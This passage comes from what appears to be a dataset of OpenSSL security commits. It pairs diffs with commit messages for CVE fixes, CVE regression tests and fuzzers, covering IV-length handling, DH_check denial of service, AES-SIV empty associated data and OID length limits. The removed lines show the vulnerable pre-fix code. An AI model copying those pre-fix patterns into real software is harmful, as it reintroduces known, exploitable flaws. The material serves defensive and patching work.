    +    OSSL_PARAM params[2] = {\n+        OSSL_PARAM_END, OSSL_PARAM_END\n+    };\n\
    +\n+    if ((ctx = EVP_CIPHER_CTX_new()) == NULL)\n+        goto err;\n+\n+  \
    \  if ((cipher = EVP_CIPHER_fetch(testctx, \"RC4\", \"\")) == NULL)\n+       \
    \ goto err;\n+\n+    params[0] = OSSL_PARAM_construct_size_t(OSSL_CIPHER_PARAM_KEYLEN,\n\
    +                                            &rc4_key_s);\n+\n+    if (!TEST_true(EVP_DecryptInit_ex2(ctx,\
    \ cipher, rc4_key, NULL, params))\n+            || !TEST_true(EVP_DecryptUpdate(ctx,\
    \ outbuf, &outlen,\n+                                            rc4_ct, rc4_ct_s))\n\
    +            || !TEST_mem_eq(outbuf, outlen, rc4_pt, rc4_pt_s))\n+        goto\
    \ err;\n+\n+    ret = 1;\n+err:\n+    EVP_CIPHER_free(cipher);\n+    EVP_CIPHER_CTX_free(ctx);\n\
    +\n+    return ret;\n+}\n+\n+static int test_aes_rc4_keylen_change_cve_2023_5363(void)\n\
    +{\n+    /* RC4 test data obtained from RFC 6229 */\n+    static const struct\
    \ {\n+        unsigned char key[5];\n+        unsigned char padding[11];\n+  \
    \  } rc4_key = {\n+        {   /* Five bytes of key material */\n+           \
    \ 0x83, 0x32, 0x22, 0x77, 0x2a,\n+        },\n+        {   /* Random padding to\
    \ 16 bytes */\n+            0x80, 0xad, 0x97, 0xbd, 0xc9, 0x73, 0xdf, 0x8a, 0xaa,\
    \ 0x32, 0x91\n+        }\n+    };\n+    static const unsigned char rc4_pt[] =\
    \ {\n+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n+        0x00,\
    \ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00\n+    };\n+    static const unsigned\
    \ char rc4_ct[] = {\n+        0x80, 0xad, 0x97, 0xbd, 0xc9, 0x73, 0xdf, 0x8a,\n\
    +        0x2e, 0x87, 0x9e, 0x92, 0xa4, 0x97, 0xef, 0xda\n+    };\n+\n+    if (lgcyprov\
    \ == NULL)\n+        return TEST_skip(\"Test requires legacy provider to be loaded\"\
    );\n+\n+    return rc4_encrypt(rc4_key.key, sizeof(rc4_key.key),\n+          \
    \             rc4_pt, sizeof(rc4_pt), rc4_ct, sizeof(rc4_ct))\n+        && rc4_decrypt(rc4_key.key,\
    \ sizeof(rc4_key.key),\n+                       rc4_pt, sizeof(rc4_pt), rc4_ct,\
    \ sizeof(rc4_ct));\n+}\n+#endif\n+\n int setup_tests(void)\n {\n     OPTION_CHOICE\
    \ o;\n@@ -5199,6 +5446,12 @@ int setup_tests(void)\n \n     ADD_TEST(test_sign_continuation);\n\
    \ \n+    /* Test cases for CVE-2023-5363 */\n+    ADD_TEST(test_aes_gcm_ivlen_change_cve_2023_5363);\n\
    +#ifndef OPENSSL_NO_RC4\n+    ADD_TEST(test_aes_rc4_keylen_change_cve_2023_5363);\n\
    +#endif\n+\n     return 1;\n }\n "
  commit_message: 'test: add unit test for CVE-2023-5363


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Hugo Landau <hlandau@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>'
  commit_sha: a2fe10ca39f9a8e251b98bc03c3b1bbb6ad1496f
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/evp/evp_enc.c\n+++ b/crypto/evp/evp_enc.c\n@@ -233,6 +233,42 @@\
    \ static int evp_cipher_init_internal(EVP_CIPHER_CTX *ctx,\n             return\
    \ 0;\n     }\n \n+#ifndef FIPS_MODULE\n+    /*\n+     * Fix for CVE-2023-5363\n\
    +     * Passing in a size as part of the init call takes effect late\n+     *\
    \ so, force such to occur before the initialisation.\n+     *\n+     * The FIPS\
    \ provider's internal library context is used in a manner\n+     * such that this\
    \ is not an issue.\n+     */\n+    if (params != NULL) {\n+        OSSL_PARAM\
    \ param_lens[3] = { OSSL_PARAM_END, OSSL_PARAM_END,\n+                       \
    \              OSSL_PARAM_END };\n+        OSSL_PARAM *q = param_lens;\n+    \
    \    const OSSL_PARAM *p;\n+\n+        p = OSSL_PARAM_locate_const(params, OSSL_CIPHER_PARAM_KEYLEN);\
    \ \n+        if (p != NULL)\n+            memcpy(q++, p, sizeof(*q));\n+\n+  \
    \      /*\n+         * Note that OSSL_CIPHER_PARAM_AEAD_IVLEN is a synomym for\n\
    +         * OSSL_CIPHER_PARAM_IVLEN so both are covered here.\n+         */\n\
    +        p = OSSL_PARAM_locate_const(params, OSSL_CIPHER_PARAM_IVLEN);\n+    \
    \    if (p != NULL)\n+            memcpy(q++, p, sizeof(*q));\n+\n+        if\
    \ (q != param_lens) {\n+            if (!EVP_CIPHER_CTX_set_params(ctx, param_lens))\
    \ {\n+                ERR_raise(ERR_LIB_EVP, EVP_R_INVALID_LENGTH);\n+       \
    \         return 0;\n+            }\n+        }\n+    }\n+#endif\n+\n     if (enc)\
    \ {\n         if (ctx->cipher->einit == NULL) {\n             ERR_raise(ERR_LIB_EVP,\
    \ EVP_R_INITIALIZATION_ERROR);"
  commit_message: 'evp: process key length and iv length early if present


    evp_cipher_init_internal() takes a params array argument and this is processed

    late in the initialisation process for some ciphers (AEAD ones).


    This means that changing the IV length as a parameter will either truncate the

    IV (very bad if SP 800-38d section 8.2.1 is used) or grab extra uninitialised

    bytes.


    Truncation is very bad if SP 800-38d section 8.2.1 is being used to

    contruct a deterministic IV.  This leads to an instant loss of confidentiality.


    Grabbing extra bytes isn''t so serious, it will most likely result in a bad

    decryption.


    Problem reported by Tony Battersby of Cybernetics.com but earlier discovered

    and raised as issue #19822.


    Fixes CVE-2023-5363

    Fixes #19822


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Hugo Landau <hlandau@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>'
  commit_sha: f3a7e6c057b5054aa05710f3d528b92e3e885268
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/fuzz/x509.c\n+++ b/fuzz/x509.c\n@@ -9,6 +9,7 @@\n  */\n \n #include <openssl/x509.h>\n\
    +#include <openssl/ocsp.h>\n #include <openssl/bio.h>\n #include <openssl/err.h>\n\
    \ #include <openssl/rand.h>\n@@ -17,31 +18,131 @@\n int FuzzerInitialize(int *argc,\
    \ char ***argv)\n {\n     FuzzerSetRand();\n-    OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CRYPTO_STRINGS,\
    \ NULL);\n+    OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CRYPTO_STRINGS\n+       |\
    \ OPENSSL_INIT_ADD_ALL_CIPHERS | OPENSSL_INIT_ADD_ALL_DIGESTS, NULL);\n     ERR_clear_error();\n\
    \     CRYPTO_free_ex_index(0, -1);\n     return 1;\n }\n \n+static int cb(int\
    \ ok, X509_STORE_CTX *ctx)\n+{\n+    return 1;\n+}\n+\n int FuzzerTestOneInput(const\
    \ uint8_t *buf, size_t len)\n {\n     const unsigned char *p = buf;\n+    size_t\
    \ orig_len = len;\n     unsigned char *der = NULL;\n+    BIO *bio = NULL;\n+ \
    \   X509 *x509_1 = NULL, *x509_2 = NULL;\n+    X509_STORE *store = NULL;\n+  \
    \  X509_VERIFY_PARAM *param = NULL;\n+    X509_STORE_CTX *ctx = NULL;\n+    X509_CRL\
    \ *crl = NULL;\n+    STACK_OF(X509_CRL) *crls = NULL;\n+    STACK_OF(X509) *certs\
    \ = NULL;\n+    OCSP_RESPONSE *resp = NULL;\n+    OCSP_BASICRESP *bs = NULL;\n\
    +    OCSP_CERTID *id = NULL;\n+\n+    x509_1 = d2i_X509(NULL, &p, len);\n+   \
    \ if (x509_1 == NULL)\n+        goto err;\n+\n+    bio = BIO_new(BIO_s_null());\n\
    +    if (bio == NULL)\n+        goto err;\n+\n+    /* This will load and print\
    \ the public key as well as extensions */\n+    X509_print(bio, x509_1);\n+  \
    \  BIO_free(bio);\n+\n+    X509_issuer_and_serial_hash(x509_1);\n+\n+    i2d_X509(x509_1,\
    \ &der);\n+    OPENSSL_free(der);\n+\n+    len = orig_len - (p - buf);\n+    x509_2\
    \ = d2i_X509(NULL, &p, len);\n+    if (x509_2 == NULL)\n+        goto err;\n+\n\
    +    len = orig_len - (p - buf);\n+    crl = d2i_X509_CRL(NULL, &p, len);\n+ \
    \   if (crl == NULL)\n+        goto err;\n+\n+    len = orig_len - (p - buf);\n\
    +    resp = d2i_OCSP_RESPONSE(NULL, &p, len);\n+\n+    store = X509_STORE_new();\n\
    +    X509_STORE_add_cert(store, x509_2);\n \n-    X509 *x509 = d2i_X509(NULL,\
    \ &p, len);\n-    if (x509 != NULL) {\n-        BIO *bio = BIO_new(BIO_s_null());\n\
    -        /* This will load and print the public key as well as extensions */\n\
    -        X509_print(bio, x509);\n-        BIO_free(bio);\n+    param = X509_VERIFY_PARAM_new();\n\
    +    X509_VERIFY_PARAM_set_flags(param, X509_V_FLAG_NO_CHECK_TIME);\n+    X509_VERIFY_PARAM_set_flags(param,\
    \ X509_V_FLAG_X509_STRICT);\n+    X509_VERIFY_PARAM_set_flags(param, X509_V_FLAG_PARTIAL_CHAIN);\n\
    +    X509_VERIFY_PARAM_set_flags(param, X509_V_FLAG_CRL_CHECK);\n \n-        X509_issuer_and_serial_hash(x509);\n\
    +    X509_STORE_set1_param(store, param);\n \n-        i2d_X509(x509, &der);\n\
    -        OPENSSL_free(der);\n+    X509_STORE_set_verify_cb(store, cb);\n \n- \
    \       X509_free(x509);\n+    ctx = X509_STORE_CTX_new();\n+    if (ctx == NULL)\n\
    +        goto err;\n+\n+    X509_STORE_CTX_init(ctx, store, x509_1, NULL);\n+\n\
    +    if (crl != NULL) {\n+        crls = sk_X509_CRL_new_null();\n+        if\
    \ (crls == NULL)\n+            goto err;\n+\n+        sk_X509_CRL_push(crls, crl);\n\
    +        X509_STORE_CTX_set0_crls(ctx, crls);\n     }\n+\n+    X509_verify_cert(ctx);\n\
    +\n+    if (resp != NULL)\n+        bs = OCSP_response_get1_basic(resp);\n+\n\
    +    if (bs != NULL) {\n+        int status, reason;\n+        ASN1_GENERALIZEDTIME\
    \ *revtime, *thisupd, *nextupd;\n+\n+        certs = sk_X509_new_null();\n+  \
    \      if (certs == NULL)\n+            goto err;\n+\n+        sk_X509_push(certs,\
    \ x509_1);\n+        sk_X509_push(certs, x509_2);\n+\n+        OCSP_basic_verify(bs,\
    \ certs, store, OCSP_PARTIAL_CHAIN);\n+\n+        id = OCSP_cert_to_id(NULL, x509_1,\
    \ x509_2);\n+        if (id == NULL)\n+            goto err;\n+        OCSP_resp_find_status(bs,\
    \ id, &status, &reason, &revtime, &thisupd,\n+                              &nextupd);\n\
    +    }\n+\n+err:\n+    X509_STORE_CTX_free(ctx);\n+    X509_VERIFY_PARAM_free(param);\n\
    +    X509_STORE_free(store);\n+    X509_free(x509_1);\n+    X509_free(x509_2);\n\
    +    X509_CRL_free(crl);\n+    OCSP_CERTID_free(id);\n+    OCSP_BASICRESP_free(bs);\n\
    +    OCSP_RESPONSE_free(resp);\n+    sk_X509_CRL_free(crls);\n+    sk_X509_free(certs);\n\
    +\n     ERR_clear_error();\n     return 0;\n }"
  commit_message: 'Update X509 fuzzer to verify a chain


    It add supports for verifying that it''s been signed by a CA, and

    checks the CRL and OCSP status


    Can find CVE-2022-4203 and CVE-2023-0286


    Reviewed-by: Bernd Edlinger <bernd.edlinger@hotmail.de>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Dmitry Belyavskiy <beldmit@gmail.com>

    Reviewed-by: Hugo Landau <hlandau@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/20243)'
  commit_sha: 399c2da08ab9c6a382f8e9950742a022e847fec0
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/dh/dh_check.c\n+++ b/crypto/dh/dh_check.c\n@@ -143,7 +143,7 @@ int\
    \ DH_check(const DH *dh, int *ret)\n #ifdef FIPS_MODULE\n     return DH_check_params(dh,\
    \ ret);\n #else\n-    int ok = 0, r;\n+    int ok = 0, r, q_good = 0;\n     BN_CTX\
    \ *ctx = NULL;\n     BIGNUM *t1 = NULL, *t2 = NULL;\n     int nid = DH_get_nid((DH\
    \ *)dh);\n@@ -172,6 +172,13 @@ int DH_check(const DH *dh, int *ret)\n        \
    \ goto err;\n \n     if (dh->params.q != NULL) {\n+        if (BN_ucmp(dh->params.p,\
    \ dh->params.q) > 0)\n+            q_good = 1;\n+        else\n+            *ret\
    \ |= DH_CHECK_INVALID_Q_VALUE;\n+    }\n+\n+    if (q_good) {\n         if (BN_cmp(dh->params.g,\
    \ BN_value_one()) <= 0)\n             *ret |= DH_NOT_SUITABLE_GENERATOR;\n   \
    \      else if (BN_cmp(dh->params.g, dh->params.p) >= 0)"
  commit_message: 'DH_check(): Do not try checking q properties if it is obviously
    invalid


    If  |q| >= |p| then the q value is obviously wrong as q

    is supposed to be a prime divisor of p-1.


    We check if p is overly large so this added test implies that

    q is not large either when performing subsequent tests using that

    q value.


    Otherwise if it is too large these additional checks of the q value

    such as the primality test can then trigger DoS by doing overly long

    computations.


    Fixes CVE-2023-3817


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tom Cosgrove <tom.cosgrove@arm.com>

    Reviewed-by: Todd Short <todd.short@me.com>

    (Merged from https://github.com/openssl/openssl/pull/21550)'
  commit_sha: 1c16253f3c3a8d1e25918c3f404aae6a5b0893de
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/test/dhtest.c\n+++ b/test/dhtest.c\n@@ -73,7 +73,7 @@ static int dh_test(void)\n\
    \         goto err1;\n \n     /* check fails, because p is way too small */\n\
    -    if (!DH_check(dh, &i))\n+    if (!TEST_true(DH_check(dh, &i)))\n        \
    \ goto err2;\n     i ^= DH_MODULUS_TOO_SMALL;\n     if (!TEST_false(i & DH_CHECK_P_NOT_PRIME)\n\
    @@ -124,6 +124,17 @@ static int dh_test(void)\n     /* We'll have a stale error\
    \ on the queue from the above test so clear it */\n     ERR_clear_error();\n \n\
    +    /* Modulus of size: dh check max modulus bits + 1 */\n+    if (!TEST_true(BN_set_word(p,\
    \ 1))\n+            || !TEST_true(BN_lshift(p, p, OPENSSL_DH_CHECK_MAX_MODULUS_BITS)))\n\
    +        goto err3;\n+\n+    /*\n+     * We expect no checks at all for an excessively\
    \ large modulus\n+     */\n+    if (!TEST_false(DH_check(dh, &i)))\n+        goto\
    \ err3;\n+\n     /*\n      * II) key generation\n      */\n@@ -138,7 +149,7 @@\
    \ static int dh_test(void)\n         goto err3;\n \n     /* ... and check whether\
    \ it is valid */\n-    if (!DH_check(a, &i))\n+    if (!TEST_true(DH_check(a,\
    \ &i)))\n         goto err3;\n     if (!TEST_false(i & DH_CHECK_P_NOT_PRIME)\n\
    \             || !TEST_false(i & DH_CHECK_P_NOT_SAFE_PRIME)"
  commit_message: 'Add a test for CVE-2023-3446


    Confirm that the only errors DH_check() finds with DH parameters with an

    excessively long modulus is that the modulus is too large. We should not

    be performing time consuming checks using that modulus.


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tom Cosgrove <tom.cosgrove@arm.com>

    Reviewed-by: Bernd Edlinger <bernd.edlinger@hotmail.de>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/21451)'
  commit_sha: ede782b4c8868d1f09c9cd237f82b6f35b7dba8b
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/dh/dh_check.c\n+++ b/crypto/dh/dh_check.c\n@@ -152,6 +152,12 @@\
    \ int DH_check(const DH *dh, int *ret)\n     if (nid != NID_undef)\n         return\
    \ 1;\n \n+    /* Don't do any checks at all with an excessively large modulus\
    \ */\n+    if (BN_num_bits(dh->params.p) > OPENSSL_DH_CHECK_MAX_MODULUS_BITS)\
    \ {\n+        ERR_raise(ERR_LIB_DH, DH_R_MODULUS_TOO_LARGE);\n+        return\
    \ 0;\n+    }\n+\n     if (!DH_check_params(dh, ret))\n         return 0;\n "
  commit_message: 'Fix DH_check() excessive time with over sized modulus


    The DH_check() function checks numerous aspects of the key or parameters

    that have been supplied. Some of those checks use the supplied modulus

    value even if it is excessively large.


    There is already a maximum DH modulus size (10,000 bits) over which

    OpenSSL will not generate or derive keys. DH_check() will however still

    perform various tests for validity on such a large modulus. We introduce a

    new maximum (32,768) over which DH_check() will just fail.


    An application that calls DH_check() and supplies a key or parameters

    obtained from an untrusted source could be vulnerable to a Denial of

    Service attack.


    The function DH_check() is itself called by a number of other OpenSSL

    functions. An application calling any of those other functions may

    similarly be affected. The other functions affected by this are

    DH_check_ex() and EVP_PKEY_param_check().


    CVE-2023-3446


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tom Cosgrove <tom.cosgrove@arm.com>

    Reviewed-by: Bernd Edlinger <bernd.edlinger@hotmail.de>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/21451)'
  commit_sha: 9e0094e2aa1b3428a12d5095132f133c078d3c3d
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/providers/implementations/ciphers/cipher_aes_siv.c\n+++ b/providers/implementations/ciphers/cipher_aes_siv.c\n\
    @@ -118,14 +118,18 @@ static int siv_cipher(void *vctx, unsigned char *out, size_t\
    \ *outl,\n     if (!ossl_prov_is_running())\n         return 0;\n \n-    if (inl\
    \ == 0) {\n-        *outl = 0;\n-        return 1;\n-    }\n+    /* Ignore just\
    \ empty encryption/decryption call and not AAD. */\n+    if (out != NULL) {\n\
    +        if (inl == 0) {\n+            if (outl != NULL)\n+                *outl\
    \ = 0;\n+            return 1;\n+        }\n \n-    if (outsize < inl) {\n-  \
    \      ERR_raise(ERR_LIB_PROV, PROV_R_OUTPUT_BUFFER_TOO_SMALL);\n-        return\
    \ 0;\n+        if (outsize < inl) {\n+            ERR_raise(ERR_LIB_PROV, PROV_R_OUTPUT_BUFFER_TOO_SMALL);\n\
    +            return 0;\n+        }\n     }\n \n     if (ctx->hw->cipher(ctx, out,\
    \ in, inl) <= 0)"
  commit_message: 'Do not ignore empty associated data with AES-SIV mode


    The AES-SIV mode allows for multiple associated data items

    authenticated separately with any of these being 0 length.


    The provided implementation ignores such empty associated data

    which is incorrect in regards to the RFC 5297 and is also

    a security issue because such empty associated data then become

    unauthenticated if an application expects to authenticate them.


    Fixes CVE-2023-2975


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/21384)'
  commit_sha: c426c281cfc23ab182f7d7d7a35229e7db1494d9
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/bn/bn_recp.c\n+++ b/crypto/bn/bn_recp.c\n@@ -42,7 +42,7 @@ void\
    \ BN_RECP_CTX_free(BN_RECP_CTX *recp)\n \n int BN_RECP_CTX_set(BN_RECP_CTX *recp,\
    \ const BIGNUM *d, BN_CTX *ctx)\n {\n-    if (!BN_copy(&(recp->N), d))\n+    if\
    \ (BN_is_zero(d) || !BN_copy(&(recp->N), d))\n         return 0;\n     BN_zero(&(recp->Nr));\n\
    \     recp->num_bits = BN_num_bits(d);"
  commit_message: 'Check for 0 modulus in BN_RECP_CTX_set.

    The function BN_RECP_CTX_set did not check whether arg d is zero,

    in which case an early failure should be returned to the invoker.

    This is a similar fix to the cognate defect of CVE-2015-1794.


    Fixes #21111


    CLA: trivial


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/21255)'
  commit_sha: 43596b306b1fe06da3b1a99e07c0cf235898010d
  repo_name: openssl/openssl
- commit_diff:
  - '--- a/fuzz/decoder.c

    +++ b/fuzz/decoder.c

    @@ -0,0 +1,86 @@

    +/*

    + * Copyright 2023 The OpenSSL Project Authors. All Rights Reserved.

    + *

    + * Licensed under the Apache License 2.0 (the "License");

    + * you may not use this file except in compliance with the License.

    + * You may obtain a copy of the License at

    + * https://www.openssl.org/source/license.html

    + * or in the file LICENSE in the source distribution.

    + */

    +

    +#include <openssl/decoder.h>

    +#include <openssl/err.h>

    +#include <openssl/rand.h>

    +#include "fuzzer.h"

    +

    +static ASN1_PCTX *pctx;

    +

    +int FuzzerInitialize(int *argc, char ***argv)

    +{

    +    FuzzerSetRand();

    +

    +    OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CRYPTO_STRINGS

    +                        | OPENSSL_INIT_ADD_ALL_CIPHERS

    +                        | OPENSSL_INIT_ADD_ALL_DIGESTS, NULL);

    +

    +    pctx = ASN1_PCTX_new();

    +    ASN1_PCTX_set_flags(pctx, ASN1_PCTX_FLAGS_SHOW_ABSENT

    +                              | ASN1_PCTX_FLAGS_SHOW_SEQUENCE

    +                              | ASN1_PCTX_FLAGS_SHOW_SSOF

    +                              | ASN1_PCTX_FLAGS_SHOW_TYPE

    +                              | ASN1_PCTX_FLAGS_SHOW_FIELD_STRUCT_NAME);

    +    ASN1_PCTX_set_str_flags(pctx, ASN1_STRFLGS_UTF8_CONVERT

    +                                  | ASN1_STRFLGS_SHOW_TYPE

    +                                  | ASN1_STRFLGS_DUMP_ALL);

    +

    +    ERR_clear_error();

    +    CRYPTO_free_ex_index(0, -1);

    +    return 1;

    +}

    +

    +int FuzzerTestOneInput(const uint8_t *buf, size_t len)

    +{

    +    OSSL_DECODER_CTX *dctx;

    +    EVP_PKEY *pkey = NULL;

    +    EVP_PKEY_CTX *ctx = NULL;

    +    BIO *bio;

    +

    +    bio = BIO_new(BIO_s_null());

    +    dctx = OSSL_DECODER_CTX_new_for_pkey(&pkey, NULL, NULL, NULL, 0, NULL,

    +                                                NULL);

    +    if (dctx == NULL) {

    +        return 0;

    +    }

    +    if (OSSL_DECODER_from_data(dctx, &buf, &len)) {

    +        EVP_PKEY *pkey2;

    +

    +        EVP_PKEY_print_public(bio, pkey, 1, pctx);

    +        EVP_PKEY_print_private(bio, pkey, 1, pctx);

    +        EVP_PKEY_print_params(bio, pkey, 1, pctx);

    +

    +        pkey2 = EVP_PKEY_dup(pkey);

    +        OPENSSL_assert(pkey2 != NULL);

    +        EVP_PKEY_eq(pkey, pkey2);

    +        EVP_PKEY_free(pkey2);

    +

    +        ctx = EVP_PKEY_CTX_new(pkey, NULL);

    +        EVP_PKEY_param_check(ctx);

    +        EVP_PKEY_public_check(ctx);

    +        EVP_PKEY_private_check(ctx);

    +        EVP_PKEY_pairwise_check(ctx);

    +        OPENSSL_assert(ctx != NULL);

    +        EVP_PKEY_CTX_free(ctx);

    +        EVP_PKEY_free(pkey);

    +    }

    +    OSSL_DECODER_CTX_free(dctx);

    +

    +    BIO_free(bio);

    +    ERR_clear_error();

    +    return 0;

    +}

    +

    +void FuzzerCleanup(void)

    +{

    +    ASN1_PCTX_free(pctx);

    +    FuzzerClearRand();

    +}'
  commit_message: 'Add decoder fuzzer


    This found CVE-2023-0217


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/20269)'
  commit_sha: a9e6100bc98439ca787aa1fce541550ad1ff3e84
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/objects/obj_dat.c\n+++ b/crypto/objects/obj_dat.c\n@@ -464,6 +464,25\
    \ @@ int OBJ_obj2txt(char *buf, int buf_len, const ASN1_OBJECT *a, int no_name)\n\
    \     first = 1;\n     bl = NULL;\n \n+    /*\n+     * RFC 2578 (STD 58) says\
    \ this about OBJECT IDENTIFIERs:\n+     *\n+     * > 3.5. OBJECT IDENTIFIER values\n\
    +     * >\n+     * > An OBJECT IDENTIFIER value is an ordered list of non-negative\n\
    +     * > numbers. For the SMIv2, each number in the list is referred to as a\n\
    +     * > sub-identifier, there are at most 128 sub-identifiers in a value,\n\
    +     * > and each sub-identifier has a maximum value of 2^32-1 (4294967295\n\
    +     * > decimal).\n+     *\n+     * So a legitimate OID according to this RFC\
    \ is at most (32 * 128 / 7),\n+     * i.e. 586 bytes long.\n+     *\n+     * Ref:\
    \ https://datatracker.ietf.org/doc/html/rfc2578#section-3.5\n+     */\n+    if\
    \ (len > 586)\n+        goto err;\n+\n     while (len > 0) {\n         l = 0;\n\
    \         use_bn = 0;"
  commit_message: 'Restrict the size of OBJECT IDENTIFIERs that OBJ_obj2txt will translate


    OBJ_obj2txt() would translate any size OBJECT IDENTIFIER to canonical

    numeric text form.  For gigantic sub-identifiers, this would take a very

    long time, the time complexity being O(n^2) where n is the size of that

    sub-identifier.


    To mitigate this, a restriction on the size that OBJ_obj2txt() will

    translate to canonical numeric text form is added, based on RFC 2578

    (STD 58), which says this:


    > 3.5. OBJECT IDENTIFIER values

    >

    > An OBJECT IDENTIFIER value is an ordered list of non-negative numbers.

    > For the SMIv2, each number in the list is referred to as a sub-identifier,

    > there are at most 128 sub-identifiers in a value, and each sub-identifier

    > has a maximum value of 2^32-1 (4294967295 decimal).


    Fixes otc/security#96

    Fixes CVE-2023-2650


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: d63b3e7959e79f98d60760a739f7876dc5adc838
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/fuzz/pem.c\n+++ b/fuzz/pem.c\n@@ -0,0 +1,59 @@\n+/*\n+ * Copyright 2022\
    \ The OpenSSL Project Authors. All Rights Reserved.\n+ *\n+ * Licensed under the\
    \ Apache License 2.0 (the \"License\");\n+ * you may not use this file except\
    \ in compliance with the License.\n+ * You may obtain a copy of the License at\n\
    + * https://www.openssl.org/source/license.html\n+ * or in the file LICENSE in\
    \ the source distribution.\n+ */\n+\n+#include <openssl/pem.h>\n+#include <openssl/err.h>\n\
    +#include \"fuzzer.h\"\n+\n+int FuzzerInitialize(int *argc, char ***argv)\n+{\n\
    +    OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CRYPTO_STRINGS, NULL);\n+    ERR_clear_error();\n\
    +    CRYPTO_free_ex_index(0, -1);\n+    return 1;\n+}\n+\n+int FuzzerTestOneInput(const\
    \ uint8_t *buf, size_t len)\n+{\n+    BIO *in;\n+    char *name = NULL, *header\
    \ = NULL;\n+    unsigned char *data = NULL;\n+    long outlen;\n+\n+    if (len\
    \ <= 1)\n+        return 0;\n+\n+    in = BIO_new(BIO_s_mem());\n+    OPENSSL_assert((size_t)BIO_write(in,\
    \ buf + 1, len - 1) == len - 1);\n+    if (PEM_read_bio_ex(in, &name, &header,\
    \ &data, &outlen, buf[0]) == 1) {\n+\t/* Try to read all the data we get to see\
    \ if allocated properly. */\n+        BIO_write(in, name, strlen(name));\n+\t\
    BIO_write(in, header, strlen(header));\n+\tBIO_write(in, data, outlen);\n+   \
    \ }\n+    if (buf[0] & PEM_FLAG_SECURE) {\n+        OPENSSL_secure_free(name);\n\
    +        OPENSSL_secure_free(header);\n+        OPENSSL_secure_free(data);\n+\
    \    } else {\n+        OPENSSL_free(name);\n+        OPENSSL_free(header);\n\
    +        OPENSSL_free(data);\n+    }\n+\n+    BIO_free(in);\n+    ERR_clear_error();\n\
    +\n+    return 0;\n+}\n+\n+void FuzzerCleanup(void)\n+{\n+}"
  commit_message: 'Add PEM fuzzer


    This fuzzer can find CVE-2022-4450


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/20242)'
  commit_sha: bc07d371865095643ec4f7190f26b174830a2f02
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/providers/implementations/kdfs/hkdf.c\n+++ b/providers/implementations/kdfs/hkdf.c\n\
    @@ -531,7 +531,7 @@ static int HKDF_Expand(const EVP_MD *evp_md,\n         if\
    \ (!HMAC_Final(hmac, prev, NULL))\n             goto err;\n \n-        copy_len\
    \ = (done_len + dig_len > okm_len) ?\n+        copy_len = (dig_len > okm_len -\
    \ done_len) ?\n                        okm_len - done_len :\n                \
    \        dig_len;\n "
  commit_message: 'Update hkdf.c to avoid potentially vulnerable code pattern


    The expression "if (a+b>c) a=c-b" is incorrect if "a+b" overflows.

    It should be replaced by "if (a>c-b) a=c-b", which avoids the

    potential overflow and is much easier to understand.


    This pattern is the root cause of CVE-2022-37454, a buffer overflow

    vulnerability in the "official" SHA-3 implementation.


    It has been confirmed that the addition in

    https://github.com/openssl/openssl/blob/master/providers/implementations/kdfs/hkdf.c#L534

    cannot overflow. So this is only a minor change proposal to avoid

    a potentially vulnerable code pattern and to improve readability.

    More information: https://github.com/github/codeql/pull/12036#issuecomment-1466056959


    CLA: trivial


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/20990)'
  commit_sha: 56a51b5a1ecd54eadc80bed4bfe5044a340787c1
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/bn/bn_asm.c\n+++ b/crypto/bn/bn_asm.c\n@@ -381,25 +381,33 @@ BN_ULONG\
    \ bn_sub_words(BN_ULONG *r, const BN_ULONG *a, const BN_ULONG *b,\n #ifndef OPENSSL_SMALL_FOOTPRINT\n\
    \     while (n & ~3) {\n         t1 = a[0];\n-        t2 = b[0];\n-        r[0]\
    \ = (t1 - t2 - c) & BN_MASK2;\n-        if (t1 != t2)\n-            c = (t1 <\
    \ t2);\n+        t2 = (t1 - c) & BN_MASK2;\n+        c  = (t2 > t1);\n+      \
    \  t1 = b[0];\n+        t1 = (t2 - t1) & BN_MASK2;\n+        r[0] = t1;\n+   \
    \     c += (t1 > t2);\n         t1 = a[1];\n-        t2 = b[1];\n-        r[1]\
